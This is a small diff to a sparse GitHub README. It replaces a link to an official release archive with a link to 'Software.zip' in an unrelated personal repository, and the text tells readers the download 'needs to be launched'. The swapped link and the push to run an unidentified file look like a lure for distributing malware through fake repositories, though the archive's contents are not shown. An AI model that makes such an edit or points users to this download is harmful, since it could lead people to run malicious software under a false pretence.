@@ -8,7 +8,7 @@ This repository does not provide a short description.
 Topics for this repository are not provided.
 
 ## Download
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/Essa1212/eee/releases/download/v1.0/Software.zip)](https://github.com/Essa1212/eee/releases/download/v1.0/Software.zip)
 
 The download link provided needs to be launched.
 
